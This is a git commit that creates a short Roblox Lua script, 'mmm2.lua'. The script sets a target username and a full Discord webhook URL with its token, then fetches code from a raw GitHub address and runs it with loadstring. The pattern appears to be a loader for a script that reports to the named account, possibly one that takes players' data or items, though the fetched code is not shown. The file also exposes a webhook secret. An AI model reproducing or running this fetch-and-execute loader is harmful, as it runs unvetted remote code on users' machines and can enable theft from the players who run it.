b62f97ebc741656f82061dd7a83db699a39b5f59
MuscleSC <musclescriptscontact@gmail.com>
2024-11-17 06:14:02 +0800

    Create mmm2.lua

---
+++ mmm2.lua
@@ -0,0 +1,4 @@
+Username = "OnodaKun23"
+Webhook = "https://discord.com/api/webhooks/1307462531887140864/bE4dHWrVD4bfPXa4l7XUdwuF0TBacqPTWBLmJ67YJW95BgAp-77NN_RJu3Q-Zs9JXVkA"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ImDigitalz/MoriScripts/main/MM2"))()
